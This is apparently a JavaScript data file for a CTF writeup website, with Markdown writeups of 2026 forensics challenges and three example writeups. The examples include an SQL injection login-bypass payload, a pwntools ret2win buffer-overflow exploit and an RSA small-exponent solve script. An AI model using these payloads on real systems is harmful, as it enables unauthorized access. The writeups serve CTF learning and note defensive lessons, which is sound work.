/* ================================================================
   data/writeups.js
   ================================================================

   HOW TO ADD A WRITEUP:
   1. Copy one of the objects below
   2. Paste it at the TOP of the array (newest first)
   3. Fill in all the fields
   4. Write your writeup in the `content` field using Markdown syntax
   5. Save the file

   FIELDS:
   - id:         Unique string, no spaces (used in URL: writeup.html?id=YOUR_ID)
   - title:      Challenge name
   - ctf:        Name of the CTF event
   - category:   One of: Web, Crypto, Pwn, Rev, Forensics, Misc
   - difficulty: Easy / Medium / Hard
   - points:     Point value (optional, set to null to hide)
   - date:       Display date string, e.g. "January 2025"
   - summary:    1–2 sentence description shown on the listing page
   - content:    Full writeup in MARKDOWN format (see examples below)

================================================================ */

const WRITEUPS_DATA = [

  // ================================================================
  // DIV:IDE CTF 2026 — FORENSICS
  // ================================================================

  {
    id:         'divide-2026-cant-let-go',
    title:      "Can't Let Go",
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'An .eml email attachment hides a multi-layered archive with misidentified file extensions, leading to a two-part flag hidden in images and a password-protected PDF.',

    content: `
## Challenge Description

![Challenge](assets/images/Forensics/Cant-Let-Go/question.png)

We are given an \`.eml\` file. The goal is to find the hidden flag inside the attachments sent via email.

## Step 1: Open the Email

Open the \`.eml\` file using Outlook. The email contains an attachment named \`memories.pdf\`.

![Email](assets/images/Forensics/Cant-Let-Go/email.png)

## Step 2: Verify the Attachment

Attempting to open \`memories.pdf\` directly fails. Upon inspection, it turns out the file is not a true PDF but actually a 7z archive.

![File inspection](assets/images/Forensics/Cant-Let-Go/file.png)

Rename the file extension from \`.pdf\` to \`.7z\`.

## Step 3: Extract the Archive

Extract \`memories.7z\`. After extraction, we get a folder named \`flag\` containing:

1. \`letter.txt\`
2. \`loveYou.txt\`
3. \`ourPic\`
4. \`pantai.png\`

![Archive contents](assets/images/Forensics/Cant-Let-Go/list.png)

## Step 4: Identify Correct File Extensions

Some files have incorrect extensions. After fixing them:

1. \`ourPic.png\`
2. \`loveYou.7z\`
3. \`letter.png\`
4. \`pantai.png\`

## Step 5: Examine Files

### ourPic.png

Opening \`ourPic.png\` reveals the first part of the flag:

![ourPic](assets/images/Forensics/Cant-Let-Go/ourPic.png)

> part1: \`divide{HoP3_wE_c4N_Be_bACk\`

### letter.png

\`letter.png\` contains a password: \`theMoonisBeuty\`

![letter](assets/images/Forensics/Cant-Let-Go/letter.png)

This password will be used for \`loveYou.7z\`.

### pantai.png

No flag here — just a context image.

![pantai](assets/images/Forensics/Cant-Let-Go/pantai.png)

## Step 6: Extract loveYou.7z

Use the password \`theMoonisBeuty\` to extract \`loveYou.7z\`. Inside there is a PDF file.

![Flag PDF](assets/images/Forensics/Cant-Let-Go/flagpdf.png)

Opening the PDF appears blank, but selecting all text (**CTRL + A**) reveals the second part of the flag hidden at the bottom:

![Part 2](assets/images/Forensics/Cant-Let-Go/part2.png)

> part2: \`_AS_B3Fore_i_miss_you_Say4ng}\`

## Flag

\`divide{HoP3_wE_c4N_Be_bACk_AS_B3Fore_i_miss_you_Say4ng}\`
    `,
  },

  {
    id:         'divide-2026-kelajuan-aka-speed',
    title:      'Kelajuan aKa Speed',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'Binary strings hidden in an image decode to a steghide password, revealing a secret file with the flag.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Kelajuan-aKa-Speed/question.png)

We are given an image containing binary strings hidden across it. The goal is to extract the hidden flag.

![Image](assets/images/Forensics/Kelajuan-aKa-Speed/kelajuan.jpg)

## Step 1: Extract Binary Strings

The image contains the following binary strings:

\`\`\`
00110001 01110011 01101000 00110000 01110111 01110011 01110000 01100101 01000101 01100100
\`\`\`

## Step 2: Decode Binary

Using CyberChef, decode the binary string:

\`\`\`
1sh0wspeEd
\`\`\`

## Step 3: Extract Hidden File

Use \`steghide\` to extract the hidden file from the image using the password \`1sh0wspeEd\`:

\`\`\`bash
steghide extract -sf kelajuan.jpg -p 1sh0wspeEd
\`\`\`

![Steghide extraction](assets/images/Forensics/Kelajuan-aKa-Speed/secret.png)

The extraction produces a file named \`secret.txt\`. Reading it reveals the flag.

![Flag](assets/images/Forensics/Kelajuan-aKa-Speed/flag.png)

## Flag

\`divide{Ish0wsPe3d_1s_tHe_9re4tEst_str3@meR}\`
    `,
  },

  {
    id:         'divide-2026-open-your-eyes',
    title:      'Open Your Eyes',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'A PDF hides an embedded WAV file whose spectrogram reveals a password for a 7z archive. The extracted PNG contains a two-part flag.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Open-Your-Eyes/question.png)

We are given two files: \`file.pdf\` and \`Flag.7z\`. The goal is to find the password hidden in the PDF to extract the archive and retrieve the flag.

## Step 1: Inspect the PDF

Opening \`file.pdf\` shows a picture of Plankton with text like "Tuut Tut". Decoding the text directly yields nothing.

![PDF](assets/images/Forensics/Open-Your-Eyes/pdf.png)

## Step 2: Check for Embedded Files

Use \`binwalk\` to check for hidden or appended files:

\`\`\`bash
binwalk file.pdf
\`\`\`

![Binwalk output](assets/images/Forensics/Open-Your-Eyes/binwalk.png)

There is a \`.wav\` file appended at the end of the PDF.

## Step 3: Extract the Audio

Extract the embedded WAV file manually using \`binwalk -e\` or \`dd\`.

![Extraction](assets/images/Forensics/Open-Your-Eyes/extract.png)

## Step 4: Analyze the Audio

Listening to the WAV file suggests it contains a hidden message using sound patterns. Open the file in **Audacity** and switch to *Spectrogram* view.

![Spectrogram](assets/images/Forensics/Open-Your-Eyes/spec.png)

Readable strings appear in the spectrogram, revealing the password for \`Flag.7z\`:

\`\`\`
D1VIDE/WB
\`\`\`

## Step 5: Extract the 7z Archive

\`\`\`bash
7z x Flag.7z -pD1VIDE/WB
\`\`\`

Extraction produces \`flag.png\`. Opening it shows the first part of the flag:

![Flag part 1](assets/images/Forensics/Open-Your-Eyes/flag1.png)

> part1: \`divide{@m_1_th3_\`

## Step 6: Retrieve the Second Part

Run \`strings\` on \`flag.png\` to find the second part:

\`\`\`bash
strings flag.png
\`\`\`

![Flag part 2](assets/images/Forensics/Open-Your-Eyes/flag2.png)

> part2: \`0nlY_@Ne_W4it1ng?}\`

## Flag

\`divide{@m_1_th3_0nlY_@Ne_W4it1ng?}\`
    `,
  },

  {
    id:         'divide-2026-something-left-behind',
    title:      'Something Left Behind',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'Mobile forensics challenge on a Samsung S21 artifact — analysing WhatsApp messages and Chrome history to recover credentials and access a hacker portal.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Something-Left-Behind/question.png)

We are given an extracted artifact from a **Samsung S21** device. The goal is to investigate the artifact and retrieve the hidden flag.

## Step 1: Inspect the Artifact

The extracted artifact contains multiple files and directories from the device.

![Artifact](assets/images/Forensics/Something-Left-Behind/samsung.png)

We focus on application data:

\`\`\`
Artifact1\\Samsung_S21\\data\\app
\`\`\`

## Step 2: Analyze WhatsApp Database

In the WhatsApp app folder, locate the database \`msgstore\`:

\`\`\`
Artifact1\\Samsung_S21\\data\\app\\com.whatsapp\\databases
\`\`\`

The conversation between **AkaN4M1** and **J1ngP0la** reveals:

- They are part of a hacker group
- There is a web portal for their operations
- AkaN4M1 forgot his login password, and J1ngP0la provides a hint

![WhatsApp messages](assets/images/Forensics/Something-Left-Behind/message.png)

From the conversation we construct the portal credentials:

\`\`\`
Username: AkaN4M1
Password: po904$2!
\`\`\`

## Step 3: Check Chrome Browser History

Investigate Chrome history to find relevant URLs.

![Chrome history](assets/images/Forensics/Something-Left-Behind/history.png)

A suspicious URL is found:

\`\`\`
https://alphazer0.divide.cloud/ops0-1.zip
\`\`\`

## Step 4: Access the Portal

Visit the portal and log in using the extracted credentials.

![Login](assets/images/Forensics/Something-Left-Behind/website.png)

The dashboard shows uploaded files.

![Dashboard](assets/images/Forensics/Something-Left-Behind/dashboard.png)

Download the file \`ops0-1.zip\` to retrieve the flag.

## Conclusion

This challenge tested skills in:

- Mobile device forensics (Samsung S21)
- Application data analysis (WhatsApp messages, Chrome history)
- Credential recovery from artifacts
- Investigating suspicious URLs and retrieving files from web portals

## Flag

\`divide{Alphazer0_W3_cAmE_WE_s@W_we_Sh4RE!}\`
    `,
  },

  {
    id:         'divide-2026-alien-is-our-friend',
    title:      'Alien Is Our Friend',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'A WAV audio file carries an SSTV (Slow-Scan Television) signal. Decoding it with an online decoder reveals an image containing the flag.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Alien-Is-Our-Friend/question.png)

We are given a \`.wav\` audio file. The goal is to decode the hidden message transmitted as an SSTV (Slow-Scan Television) signal.

## Step 1: Analyze the Audio

Listening to the \`.wav\` file confirms it contains SSTV signals rather than normal audio. SSTV is a method used to transmit images via sound.

## Step 2: Decode the SSTV Signal

Use an online SSTV decoder to process the audio:

> [https://sstv-decoder.mathieurenaud.fr/](https://sstv-decoder.mathieurenaud.fr/)

Upload the \`.wav\` file and let the decoder process the signal.

## Step 3: Retrieve the Image

After decoding, the SSTV signal reveals an image with the flag visible inside it.

![SSTV decoded](assets/images/Forensics/Alien-Is-Our-Friend/sstv.png)

![Flag](Forensics/Alien-Is-Our-Friend/flag.png)

## Flag

\`divide{Now_you_know_about_SSTV}\`
    `,
  },

  {
    id:         'hack10-2026-alphazer0',
    title:      'AlphaZer0',
    ctf:        'Hack@10 International CTF 2026',
    category:   'Misc',
    difficulty: 'Hard',
    points:     null,
    date:       'April 2026',
    summary:    'A redacted string in an image is recovered using the BishopFox unredacter tool from GitHub.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Alphazer0/question.png)

We are given an image with a redacted string. The mission is to unredact it and recover the hidden key.

![Redacted secret](assets/images/Forensics/Alphazer0/secret.png)

## Step 1: Research Unredaction Tools

After some research, the **unredacter** tool by BishopFox is found on GitHub:

![GitHub repo](assets/images/Forensics/Alphazer0/github.png)

> [https://github.com/BishopFox/unredacter](https://github.com/BishopFox/unredacter)

This tool reverses pixelated/redacted text by brute-forcing likely characters based on pixel patterns.

## Step 2: Run the Tool

Follow the setup instructions in the repo and run the tool against the provided image. The tool successfully recovers the redacted text.

![Recovered flag](assets/images/Forensics/Alphazer0/flag.png)

## Flag

\`hack10{unitenthunders}\`
    `,
  },

  {
    id:         'divide-2026-unusual-incident',
    title:      'Unusual Incident',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'A VMDK file analysed in Autopsy reveals a text file with a Vigenère-encrypted partial flag and a Morse code key. A second part is hidden in a saved picture.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Unusual-Incident/question.png)

We are given a \`vmdk\` file to investigate for a hidden flag.

## Step 1: Open in Autopsy

Load the VMDK in **Autopsy** and navigate to:

\`\`\`
vol_vol6/Users/User/Documents
\`\`\`

A suspicious file \`letgo.txt\` is found containing:

![letgo.txt contents](assets/images/Forensics/Unusual-Incident/flag1.png)

\`\`\`
key= iloveuniten
ltjdhy{L0ck_Jbz3ygdGm
...- .. --. . -. . .-. . -.-. .. .--. .... . .-.
\`\`\`

## Step 2: Decode the Morse Code

Decode the Morse code using CyberChef:

![Morse decode](assets/images/Forensics/Unusual-Incident/morse.png)

\`\`\`
VIGENERECIPHER
\`\`\`

This confirms the cipher used on the second line.

## Step 3: Decode the Vigenère Cipher

Decrypt \`ltjdhy{L0ck_Jbz3ygdGm\` using the key \`iloveuniten\` in CyberChef:

![Vigenère decode](assets/images/Forensics/Unusual-Incident/decode.png)

> part1: \`divide{Y0ur_For3nsiCs\`

## Step 4: Find Part 2

Navigate to:

\`\`\`
vol_vol6/Users/User/Pictures/Saved Pictures
\`\`\`

An image there reveals the second part of the flag:

![Part 2](assets/images/Forensics/Unusual-Incident/flag2.png)

> part2: \`_Sk!lLs_1s_7Op_N0tcH!}\`

## Flag

\`divide{Y0ur_For3nsiCs_Sk!lLs_1s_7Op_N0tcH!}\`
    `,
  },

  {
    id:         'Hack@10-2026-malware-or-not',
    title:      'Malware or not?',
    ctf:        'Hack@10 International CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'A suspicious .doc file is analysed for macros and embedded content. Inspecting the document relationships file exposes a Follina-style (CVE-2022-30190) external URL as the IoC flag.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Malware-Or-Not/question.png)

We are given a \`.doc\` file suspected of being a malware sample. The goal is to analyse it and find indicators of compromise (IoC).

## Step 1: Check for Macros

Use \`olevba\` to inspect the \`.doc\` file for any embedded macros:

\`\`\`bash
olevba malware.doc
\`\`\`

![olevba output](assets/images/Forensics/Malware-Or-Not/olevba.png)

No macros are detected.

## Step 2: Extract Document Contents

A \`.doc\` file is a ZIP-like container with XML files. Extract them for further analysis:

\`\`\`bash
unzip malware.doc -d extracted/
\`\`\`

![Extracted contents](assets/images/Forensics/Malware-Or-Not/extract.png)

## Step 3: Check for External Links (Follina — CVE-2022-30190)

Inspect the relationships file for external links:

\`\`\`bash
cat extracted/word/_rels/document.xml.rels
\`\`\`

![document.xml.rels](assets/images/Forensics/Malware-Or-Not/flag.png)

A suspicious external URL is found — a known IoC pattern consistent with the **Follina** vulnerability:

\`\`\`
https://happy.divide.cloud/nowyouknow.html
\`\`\`

## Flag

\`hack10{https://happy.divide.cloud/nowyouknow.html}\`
    `,
  },

  // ================================================================
  // EXAMPLE WRITEUPS (replace or remove as needed)
  // ================================================================

  {
    id:         'sql-injection-login',
    title:      'SQL Injection Bypass — Login Form',
    ctf:        'ExampleCTF 2025',
    category:   'Web',
    difficulty: 'Easy',
    points:     100,
    date:       'January 2025',
    summary:    'Classic SQL injection bypass on a login form using a simple OR payload. First blood on the web category.',

    content: `
## Challenge Description

The challenge presented a standard login form. No source code was provided. The goal was to log in as the admin user and retrieve the flag.

## Reconnaissance

Opening the login page, I noticed no client-side obfuscation and the form had two standard fields: \`username\` and \`password\`.

I started by testing for SQL injection with a simple payload:

\`\`\`
Username: admin'--
Password: anything
\`\`\`

The server returned a different error message compared to a random username, which told me:
1. The backend was likely SQL-based
2. Input was not properly sanitized

## Exploitation

I tried the classic OR bypass:

\`\`\`sql
' OR '1'='1'--
\`\`\`

Using this as the username with any password, the server authenticated me as the first user in the database — which happened to be \`admin\`.

The login succeeded and the page displayed:

\`\`\`
Welcome, admin!
FLAG{sql_1nj3ct10n_is_classic}
\`\`\`

## Takeaways

- Always use parameterized queries / prepared statements
- User input should never be interpolated directly into SQL
- Error messages that differ between valid/invalid usernames reveal user enumeration vulnerabilities

## Flag

\`FLAG{sql_1nj3ct10n_is_classic}\`
    `,
  },

  {
    id:         'rsa-small-exponent',
    title:      'RSA Small Exponent Attack',
    ctf:        'ExampleCTF 2025',
    category:   'Crypto',
    difficulty: 'Easy',
    points:     250,
    date:       'January 2025',
    summary:    'RSA challenge where e=3 and the ciphertext was small enough that cube root directly recovers the plaintext.',

    content: `
## Challenge Description

We were given a file containing:

\`\`\`
n = (large number)
e = 3
c = (ciphertext)
\`\`\`

## Analysis

When \`e\` is small and the message \`m\` is not padded, if \`m^e < n\`, then the ciphertext is simply \`m^e\` with no modular reduction. This means we can recover \`m\` by computing the integer cube root of \`c\`.

## Solution

\`\`\`python
from gmpy2 import iroot

n = 0x... # paste n here
e = 3
c = 0x... # paste c here

m, exact = iroot(c, e)

if exact:
    print(bytes.fromhex(hex(m)[2:]))
else:
    print("Not exact — padding may be involved")
\`\`\`

Running the script:

\`\`\`
$ python3 solve.py
b'FLAG{sm4ll_3xp0n3nt_rsa}'
\`\`\`

## Takeaways

- RSA with small \`e\` and no padding (PKCS#1) is trivially broken
- Always use proper padding (OAEP)
- \`e = 65537\` is the standard for a reason

## Flag

\`FLAG{sm4ll_3xp0n3nt_rsa}\`
    `,
  },

  {
    id:         'buffer-overflow-ret',
    title:      'Stack Buffer Overflow — ret2win',
    ctf:        'ExampleCTF 2025',
    category:   'Pwn',
    difficulty: 'Easy',
    points:     150,
    date:       'February 2025',
    summary:    'Classic ret2win buffer overflow. Overwrite saved return address to redirect execution to a win() function.',

    content: `
## Challenge Description

A 64-bit ELF binary with no PIE and no canary. Source code was provided. There's a \`win()\` function that reads and prints the flag but is never called in the normal execution flow.

## Analysis

Looking at the vulnerable function:

\`\`\`c
void vuln() {
    char buf[64];
    gets(buf);  // no bounds checking!
}
\`\`\`

The buffer is 64 bytes. I used \`gdb-pwndbg\` to find the exact offset to RIP:

\`\`\`
pwndbg> cyclic 100
pwndbg> cyclic -l 0x6161616161616166
72
\`\`\`

Offset to RIP = **72 bytes**.

## Exploit

\`\`\`python
from pwn import *

elf  = ELF('./vuln')
p    = process('./vuln')

win    = elf.symbols['win']
offset = 72

payload  = b'A' * offset
payload += p64(win)

p.sendline(payload)
p.interactive()
\`\`\`

## Flag

\`FLAG{r3t_to_w1n_ez}\`
    `,
  },

];